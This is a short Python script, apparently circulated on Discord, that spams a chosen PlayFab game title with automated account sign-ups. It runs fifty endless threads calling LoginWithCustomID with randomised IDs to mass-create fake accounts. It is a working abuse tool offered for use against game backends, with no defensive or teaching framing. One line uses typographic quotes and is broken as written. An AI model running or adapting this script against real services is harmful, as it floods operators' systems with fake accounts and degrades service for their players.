```

CREDIT I STOLE THIS FROM ETX

import threading, string, random
from colorama import Fore
from playfab import PlayFabClientAPI, PlayFabSettings

print("Made by, @.index")
print("https://discord.gg/GSWSahAmVU")

PlayFabSettings.TitleId = input('TitleID: ')
name = input('CustomID Name: ')
print(f”Spamming {PlayFabSettings.TitleId} with Name: {name}”)

def callback(success, failure):
  if success:

    print(Fore.GREEN + '<Debug> User Created, TitleId: ' +
          PlayFabSettings.TitleId + ', Name: ' + name)
  if failure:
    print(Fore.RED + '<Debug> Failure Within Spamming. Not Avalible, Rate Limited, or Disabled Api Calls')


def do_random_gen():
  while True:
    bomb = ''.join(
      random.choices(string.ascii_uppercase + string.hexdigits, k=5))
    request = {
      "CustomId":
      name + bomb,
      "CreateAccount":
      True,
      "DisplayName":
      "YOURCUSTOMNAME" +
      ''.join(random.choices(string.ascii_uppercase + string.hexdigits, k=5)),
    }
    PlayFabClientAPI.LoginWithCustomID(request, callback)


threads = []

for i in range(50):
  t = threading.Thread(target=do_random_gen)
  t.daemon = True
  threads.append(t)

for i in range(50):
  threads[i].start()

for i in range(50):
  threads[i].join() ```
